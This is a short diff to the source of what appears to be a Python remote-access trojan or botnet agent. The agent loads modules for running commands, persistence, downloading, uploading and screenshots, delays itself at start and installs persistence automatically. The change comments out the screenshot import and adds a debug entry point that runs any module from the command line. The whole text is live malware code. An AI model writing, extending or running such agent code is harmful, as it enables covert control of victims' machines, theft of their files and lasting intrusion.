@@ -13,7 +13,7 @@ from modules import runcmd
 from modules import persistence
 from modules import download
 from modules import upload
-from modules import screenshot
+#from modules import screenshot
 
 
 MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
@@ -43,8 +43,16 @@ General commands:
 
     utils.send_output(help_text)
 
+def main(args):
+    if settings.DEBUG:
+        if len(args) > 0 and args[0] in MODULES:
+            if len(args) > 1:
+                if args[1] == "help":
+                    print(sys.modules["modules.%s" % args[0]].help())
+                else:
+                    sys.modules["modules.%s" % args[0]].run(*args[1:])
+            sys.exit()
 
-if __name__ == "__main__":
     time.sleep(settings.PAUSE_AT_START)
     if settings.AUTO_PERSIST:
         persistence.install()
@@ -80,3 +88,6 @@ if __name__ == "__main__":
             is_idle = True
             if settings.DEBUG:
                 print exc
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
